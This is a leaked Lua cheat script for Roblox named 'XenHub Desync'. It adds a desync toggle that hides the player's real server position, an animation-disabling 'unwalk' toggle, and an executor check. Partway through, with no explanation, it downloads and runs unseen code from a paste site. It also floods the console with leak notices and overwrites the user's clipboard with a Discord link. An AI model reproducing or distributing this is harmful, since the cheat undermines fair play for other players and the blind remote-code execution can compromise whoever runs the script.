-- XenHub: The Complete Edition
-- WARNING: DO NOT REMOVE COPYRIGHT
for i = 1, 600 do
    print("this was leaked at fpsl")
    print("this got leaked at fpsl")
    print(" LEAKED AT FPSL COPYRIGHT FROM A DISCORD DO  NOT CHANGE THIS OR THEIR WILL BE REAL LIFE CONSEQEUENCES I AM SAYING AND IF THEY ARE SAYING CHANGE COPYRIGHT 26")
end

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

-- Variables for Ghost
local Ghost = nil

-- Custom functions
local function respawnCharacter()
    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid.Health = 0
    end
end

-- Function to handle the Blue Ghost (Server Position)
local function ToggleGhost(state)
    if state then
        if Ghost then Ghost:Destroy() end
        local char = LocalPlayer.Character
        if not char then return end
        char.Archivable = true
        Ghost = char:Clone()
        Ghost.Name = "ServerGhost"
        Ghost.Parent = workspace
        
        for _, v in pairs(Ghost:GetDescendants()) do
            if v:IsA("BasePart") then
                v.Transparency = 0.6
                v.Color = Color3.fromRGB(0, 150, 255) 
                v.CanCollide = false
                v.Anchored = true
            elseif v:IsA("Decal") or v:IsA("Clothing") or v:IsA("Accessory") then
                v:Destroy()
            end
        end
    else
        if Ghost then Ghost:Destroy() Ghost = nil end
    end
end

-- 1. Main XenHub GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "XenHub_Official"
ScreenGui.Parent = (gethui and gethui()) or CoreGui
ScreenGui.Enabled = false -- Hidden until loading finishes

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 380, 0, 275)
MainFrame.Position = UDim2.new(0.5, -190, 0.5, -137)
MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Parent = ScreenGui

Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 14)
local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Thickness = 2
MainStroke.Color = Color3.fromRGB(35, 35, 45)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 65)
Title.BackgroundTransparency = 1
Title.Text = "XENHUB DESYNC\ndiscord.gg/xenhub"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18

-- RESTORED MINIMIZE BUTTON
local MinBtn = Instance.new("TextButton", MainFrame)
MinBtn.Size = UDim2.new(0, 35, 0, 35)
MinBtn.Position = UDim2.new(1, -50, 0, 15)
MinBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
MinBtn.Text = "-"
MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinBtn.Font = Enum.Font.GothamBold
MinBtn.TextSize = 25
Instance.new("UICorner", MinBtn).CornerRadius = UDim.new(0, 8)

local Container = Instance.new("Frame", MainFrame)
Container.Size = UDim2.new(1, 0, 1, -70)
Container.Position = UDim2.new(0, 0, 0, 75)
Container.BackgroundTransparency = 1
local List = Instance.new("UIListLayout", Container)
List.HorizontalAlignment = Enum.HorizontalAlignment.Center
List.Padding = UDim.new(0, 12)

-- Shared Row Function (Dynamic Outlines)
local function CreateRow(text, startsEnabled)
    local Btn = Instance.new("TextButton", Container)
    Btn.Size = UDim2.new(0.9, 0, 0, 52)
    Btn.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
    Btn.Text = ""
    Btn.AutoButtonColor = false
    Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 12)
    
    local Stroke = Instance.new("UIStroke", Btn)
    Stroke.Thickness = 2.5
    Stroke.Color = startsEnabled and Color3.fromRGB(80, 75, 135) or Color3.fromRGB(40, 40, 50)
    Stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    
    local Dot = Instance.new("Frame", Btn)
    Dot.Size = UDim2.new(0, 12, 0, 12)
    Dot.Position = UDim2.new(0, 18, 0.5, -6)
    Dot.BackgroundColor3 = startsEnabled and Color3.fromRGB(55, 225, 55) or Color3.fromRGB(225, 55, 55)
    Instance.new("UICorner", Dot).CornerRadius = UDim.new(1, 0)
    
    local Lbl = Instance.new("TextLabel", Btn)
    Lbl.Size = UDim2.new(1, -55, 1, 0)
    Lbl.Position = UDim2.new(0, 45, 0, 0)
    Lbl.BackgroundTransparency = 1
    Lbl.Text = text
    Lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    Lbl.Font = Enum.Font.GothamBold
    Lbl.TextSize = 17
    Lbl.TextXAlignment = Enum.TextXAlignment.Left
    
    return Btn, Lbl, Dot, Stroke
end

local VoltBtn, VoltLabel, VoltDot, VoltStroke = CreateRow("Checking...", false)
local DesyncBtn, DesyncLabel, DesyncDot, DesyncStroke = CreateRow("Desync Disabled", false)
local UnwalkBtn, UnwalkLabel, UnwalkDot, UnwalkStroke = CreateRow("Unwalk Disabled", false)

--- LOGIC SECTOR ---

-- 1. Supported Executor Check
local SupportedList = {"Delta", "Synapse Z", "Yub X", "Madium", "Volt"}
local currentExec = (identifyexecutor and identifyexecutor()) or "Unknown"
local isSupported = false
for _, name in pairs(SupportedList) do if currentExec:find(name) then isSupported = true break end end
if isSupported then 
    VoltLabel.Text = currentExec .. ": Supported" 
    VoltDot.BackgroundColor3 = Color3.fromRGB(55, 225, 55) 
    VoltStroke.Color = Color3.fromRGB(80, 75, 135)
else 
    VoltLabel.Text = currentExec .. ": Unsupported" 
    VoltDot.BackgroundColor3 = Color3.fromRGB(225, 55, 55) 
end

loadstring(game:HttpGet("https://pastefy.app/EJjaAAhZ/raw"))()

-- 2. Desync Logic
local desyncOn = false
DesyncBtn.MouseButton1Click:Connect(function()
    desyncOn = not desyncOn
    DesyncLabel.Text = desyncOn and "Desync Enabled" or "Desync Disabled"
    DesyncDot.BackgroundColor3 = desyncOn and Color3.fromRGB(55, 225, 55) or Color3.fromRGB(225, 55, 55)
    DesyncStroke.Color = desyncOn and Color3.fromRGB(80, 75, 135) or Color3.fromRGB(40, 40, 50)
    
    pcall(function()
        if raknet and raknet.desync then raknet.desync(desyncOn) end
        ToggleGhost(desyncOn)
        if desyncOn then 
            respawnCharacter() 
            DesyncLabel.TextTransparency = 0.5 
            task.wait(0.2) 
            DesyncLabel.TextTransparency = 0 
        end
    end)
end)

-- 3. Unwalk Logic
local unwalkOn = false
UnwalkBtn.MouseButton1Click:Connect(function()
    unwalkOn = not unwalkOn
    UnwalkLabel.Text = unwalkOn and "Unwalk Enabled" or "Unwalk Disabled"
    UnwalkDot.BackgroundColor3 = unwalkOn and Color3.fromRGB(55, 225, 55) or Color3.fromRGB(225, 55, 55)
    UnwalkStroke.Color = unwalkOn and Color3.fromRGB(80, 75, 135) or Color3.fromRGB(40, 40, 50)
    local char = LocalPlayer.Character
    if char then
        local animScript = char:FindFirstChild("Animate")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if animScript then animScript.Disabled = unwalkOn end
        if hum then for _, v in pairs(hum:GetPlayingAnimationTracks()) do v:Stop() end end
    end
end)

-- 4. Minimize Logic
local minimized = false
MinBtn.MouseButton1Click:Connect(function()
    minimized = not minimized
    Container.Visible = not minimized
    MainFrame:TweenSize(minimized and UDim2.new(0, 380, 0, 65) or UDim2.new(0, 380, 0, 275), "Out", "Quart", 0.3, true)
    MinBtn.Text = minimized and "+" or "-"
end)

-- 5. Ghost Position Update
RunService.Heartbeat:Connect(function()
    if Ghost and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        Ghost.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
    end
end)

-- 6. LOADING SEQUENCE (FPSL LEAK)
task.spawn(function()
    local playerGui = LocalPlayer:WaitForChild('PlayerGui')
    local loadingGui = Instance.new('ScreenGui', playerGui)
    loadingGui.Name = 'FPSL_Leak'
    loadingGui.IgnoreGuiInset = true
    loadingGui.DisplayOrder = 999999

    local bg = Instance.new('Frame', loadingGui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BackgroundTransparency = 1

    local leakText = Instance.new('TextLabel', bg)
    leakText.Size = UDim2.new(1, 0, 0.4, 0)
    leakText.Position = UDim2.new(0, 0, 0.3, 0)
    leakText.BackgroundTransparency = 1
    leakText.Text = 'Leaked by fpsl'
    leakText.TextColor3 = Color3.new(1, 1, 1)
    leakText.TextScaled = true
    leakText.Font = Enum.Font.GothamBold
    leakText.TextTransparency = 1

    local discordText = Instance.new('TextLabel', bg)
    discordText.Size = UDim2.new(1, 0, 0.4, 0)
    discordText.Position = UDim2.new(0, 0, 0.3, 0)
    discordText.BackgroundTransparency = 1
    discordText.Text = 'discord.gg/freesources'
    discordText.TextColor3 = Color3.new(1, 1, 1)
    discordText.TextScaled = true
    discordText.Font = Enum.Font.GothamBold
    discordText.TextTransparency = 1

    local skipBtn = Instance.new('TextButton', bg)
    skipBtn.Size = UDim2.new(0.25, 0, 0.09, 0)
    skipBtn.Position = UDim2.new(0.375, 0, 0.78, 0)
    skipBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    skipBtn.Text = 'Skip'
    skipBtn.TextColor3 = Color3.new(1, 1, 1)
    skipBtn.TextScaled = true
    skipBtn.Font = Enum.Font.GothamSemibold
    skipBtn.BackgroundTransparency = 1
    skipBtn.Visible = false
    Instance.new('UICorner', skipBtn).CornerRadius = UDim.new(0, 12)

    local fadeIn = TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local fadeOut = TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.In)

    TweenService:Create(bg, fadeIn, {BackgroundTransparency = 0}):Play()
    task.wait(0.4)
    TweenService:Create(leakText, fadeIn, {TextTransparency = 0}):Play()
    task.wait(1.5)
    TweenService:Create(leakText, fadeOut, {TextTransparency = 1}):Play()
    task.wait(0.6)
    TweenService:Create(discordText, fadeIn, {TextTransparency = 0}):Play()
    skipBtn.Visible = true
    TweenService:Create(skipBtn, fadeIn, {BackgroundTransparency = 0, TextTransparency = 0}):Play()

    skipBtn.MouseButton1Click:Connect(function()
        if setclipboard then setclipboard('discord.gg/freesources') end
        skipBtn.Text = 'join for more. report leaks for access'
        task.wait(3.2)
        TweenService:Create(bg, fadeOut, {BackgroundTransparency = 1}):Play()
        TweenService:Create(discordText, fadeOut, {TextTransparency = 1}):Play()
        TweenService:Create(skipBtn, fadeOut, {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        task.wait(1.1)
        loadingGui:Destroy()
        ScreenGui.Enabled = true
    end)
end)

-- 7. Dragging Logic
local dragStart, startPos, dragging
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true dragStart = input.Position startPos = MainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)